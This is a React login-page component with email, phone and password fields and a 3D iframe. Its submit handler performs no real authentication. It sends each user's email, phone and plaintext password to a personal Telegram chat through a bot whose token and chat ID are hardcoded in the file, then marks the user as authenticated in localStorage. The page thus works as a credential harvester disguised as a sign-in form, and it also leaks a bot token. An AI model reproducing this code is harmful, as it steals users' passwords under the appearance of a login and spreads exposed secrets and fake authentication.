import { useState } from "react";
import { toast } from "react-toastify";
import { Loader } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";

export default function AuthPage() {
    const { t } = useTranslation();
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [phone, setPhone] = useState("");
    const [emailError, setEmailError] = useState(false);
    const [passError, setPassError] = useState(false);
    const [phoneError, setPhoneError] = useState(false);
    const [isloading, setLoading] = useState(false);
    const [passwordLevel, setPasswordLevel] = useState("");

    const navigate = useNavigate();

    const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const regexPassword = /^[a-zA-Z0-9!@#$%^&*]{6,16}$/;
    const regexPhone = /^\+?[0-9]{9,15}$/;

    const BOT_TOKEN = `8389898735:AAH1MsADfS6yjL3EXLbwMmlgtJ6lgPr1j3A`;
    const MY_CHAT_ID = `8155528404`;

    const handlePhoneChange = (e) => {
        const value = e.target.value;
        if (/^\+?[0-9]*$/.test(value)) {
            setPhone(value);
        }
    };

    const checkPasswordLevel = (pass) => {
        if (!pass) return setPasswordLevel("");
        const hasLetters = /[a-zA-Z]/.test(pass);
        const hasNumbers = /[0-9]/.test(pass);
        const hasSymbols = /[!@#$%^&*]/.test(pass);

        if (hasLetters && !hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.easy"));
        else if (hasLetters && hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.medium"));
        else if (hasLetters && hasNumbers && hasSymbols) setPasswordLevel(t("AuthPage.hard"));
        else setPasswordLevel(t("AuthPage.easy"));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        const emailValid = regexEmail.test(email);
        const passwordValid = regexPassword.test(password);
        const phoneValid = regexPhone.test(phone);

        setEmailError(!emailValid);
        setPassError(!passwordValid);
        setPhoneError(!phoneValid);

        if (emailValid && passwordValid && phoneValid) {
            setLoading(true);

            const text = `
🆕 ${t("AuthPage.newUser")}:

📧 Email: ${email}
📱 Telefon: ${phone}
🔐 Parol: ${password} (${passwordLevel})
            `;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: MY_CHAT_ID,
                        text,
                        parse_mode: "HTML",
                    }),
                });

                localStorage.setItem("isAuthenticated", "true");
                toast.success(t("AuthPage.success"));
                setEmail("");
                setPassword("");
                setPhone("");
                setPasswordLevel("");
                setLoading(false);

                navigate("/");
            } catch (error) {
                console.error(error);
                toast.error(t("AuthPage.error"));
                setLoading(false);
            }
        } else {
            toast.error(t("AuthPage.invalidInput"));
        }
    };

    return (
        <div className="-mt-[70px] relative w-full min-h-screen bg-cover bg-center bg-[url('/src/img/Cover.png')] flex justify-center items-center px-4">
            <form
                onSubmit={handleSubmit}
                className="flex flex-col lg:flex-row gap-6 shadow-xl w-full max-w-[900px] rounded-xl p-4 sm:p-6 bg-white/70 backdrop-blur-md border border-gray-300"
            >
                {/* SPLINE */}
                <iframe
                    src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/"
                    frameBorder="0"
                    className="w-full h-[260px] sm:h-[350px] lg:w-[500px] lg:h-[500px] rounded-md"
                ></iframe>

                {/* FORM */}
                <div className="w-full lg:w-[300px]">
                    <h2 className="text-center text-xl sm:text-2xl font-bold mb-6 text-gray-700">{t("AuthPage.title")}</h2>

                    {/* EMAIL */}
                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.email")}</label>
                        <input
                            type="text"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder={t("AuthPage.emailPlaceholder")}
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
                                emailError ? "border-red-500" : email ? "border-green-500 bg-green-100" : "border-gray-300"
                            }`}
                        />
                        {emailError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.emailError")}</p>}
                    </div>

                    {/* PHONE */}
                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.phone")}</label>
                        <input
                            type="text"
                            value={phone}
                            onChange={handlePhoneChange}
                            placeholder="+998"
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
                                phoneError ? "border-red-500" : phone ? "border-green-500 bg-green-100" : "border-gray-300"
                            }`}
                        />
                        {phoneError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.phoneError")}</p>}
                    </div>

                    {/* PASSWORD */}
                    <div className="mb-6">
                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.password")}</label>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value);
                                checkPasswordLevel(e.target.value);
                            }}
                            placeholder={t("AuthPage.passwordPlaceholder")}
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
                                passError ? "border-red-500" : password ? "border-green-500 bg-green-100" : "border-gray-300"
                            }`}
                        />
                        {password && <p className={`mt-1 text-sm`}>{t("AuthPage.passwordLevel")}: {passwordLevel}</p>}
                        {passError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.passwordError")}</p>}
                    </div>

                    <button
                        type="submit"
                        disabled={isloading}
                        className="flex items-center gap-2 justify-center w-full py-2 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all"
                    >
                        {isloading && <Loader className="animate-spin" />}
                        {t("AuthPage.submit")}
                    </button>
                </div>
            </form>
        </div>
    );
}
